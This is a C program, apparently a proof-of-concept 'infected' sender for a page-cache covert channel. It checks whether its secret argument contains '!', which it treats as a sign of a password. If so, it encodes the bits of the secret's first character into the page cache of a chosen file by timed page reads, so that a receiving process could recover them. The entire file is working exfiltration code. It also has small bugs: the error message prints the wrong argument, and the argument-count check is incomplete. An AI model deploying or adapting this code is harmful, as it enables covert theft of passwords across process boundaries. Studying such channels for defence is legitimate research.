#define _GNU_SOURCE

#include<stdio.h>
#include<time.h>
#include<unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>

#include <sys/types.h>



static int PAGE_SIZE;

int main(int argc, char *argv[]) {
    int f_map;
    int page_to_read = 0;
    long file_sz;
    size_t file_pgs;
    struct stat f_map_stat;
    size_t pg_size = sysconf(_SC_PAGESIZE);
    char buff[pg_size];

    if (argc < 2) {
        printf("Usage secret_text_infected <secret> <filename>.\n");
        exit(EBADF);
    }

    // We are naively assuming a password would contain the '!' char.
    // We are inspecting secrets. If the secret does not contain the '!' char,
    // the program will exit. If the secret is suspected as a password,
    // the program will encode the secret in the page cache.
    if (!strchr(argv[1], '!'))
        return 0;

    f_map = open(argv[2], O_RDONLY );//| O_DIRECT | O_SYNC);

    if (f_map == -1) {
        printf("Failed to open file %s\n", argv[1]);
        exit(errno);
    }

    fstat(f_map, &f_map_stat);
    file_pgs = (f_map_stat.st_size + (pg_size - 1)) / pg_size;
    printf("file includes %lu pages\n", file_pgs);

    // The arguments to mmap are not of a great importance, we will
    // use these pages just to spy on them. What we try to do here
    // with mapping the file through PROT_WRITE and MAP_SHARED pages
    // is to maximize the probability of being reclaimed. At the end
    // of the day, the main reclaim decision is made by LRU
    // priniciple.
    void *mapped_to = mmap(NULL, f_map_stat.st_size,
                           PROT_EXEC, MAP_SHARED, f_map, 0);

    // Encoding the first char of the secret suspected as password in
    // the page cache of the file in argv[2].
    for (size_t i = 0; i < 8; i++)
    {
	if (!(argv[1][0] >> i & 1))
	       continue;

	// Encoding from the end of the file.
	// Skipping 2 pages in a time since the read operation 
	// triggers 2 consecutive pages to be loaded into the cache.
	// 1010 will be encoded as 11001100.   
	lseek(f_map, ((pg_size * i * 2 * -1) - pg_size) - pg_size * page_to_read, SEEK_END);
	
	//double time_spent = 0.0;
	clock_t begin = clock();
 
        read(f_map, buff, pg_size);

	clock_t end = clock();
	
	// calculate elapsed time by finding difference (end - begin) and
	// dividing the difference by CLOCKS_PER_SEC to convert to seconds
	//time_spent += (double)(end - begin) / CLOCKS_PER_SEC;
	//printf("The elapsed time is %f seconds", time_spent);
	printf("%lu, ", (end - begin));

	usleep(3000);

    }
    printf("\n");

    fflush(stdout);

    close(f_map);
    return 0;
}
